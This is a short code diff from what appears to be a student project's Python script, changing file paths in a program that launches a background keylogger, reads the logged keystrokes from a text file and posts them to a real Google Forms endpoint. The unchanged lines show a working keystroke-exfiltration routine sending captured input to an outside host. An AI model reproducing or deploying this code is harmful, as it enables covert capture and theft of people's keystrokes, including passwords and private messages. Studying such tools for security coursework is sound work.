@@ -7,11 +7,11 @@ from pynput.keyboard import Listener
 
 startlog = time.time()
 
-os.system("python3 /home/student/Documents/ITP270_001N_FALL2022/Python_Learning/keylogger.py & ")
+os.system("python3 /home/student/ITP270_001N_FALL2022/Python_Learning/keylogger.py & ")
 time.sleep(1)
 
 def send_request():
-    form_input = open("/home/student/Documents/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
+    form_input = open("/home/student/ITP270_001N_FALL2022/Python_Learning/keyboard_Input.txt")
     form_send = form_input.read()
     url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSd63z5rAVie4clZ-PttFpHwCUJuhBeU6cCIbgsPGiZqbOz19g/formResponse'
     form_data = {'entry.839337160' : f"'{form_send}'"}
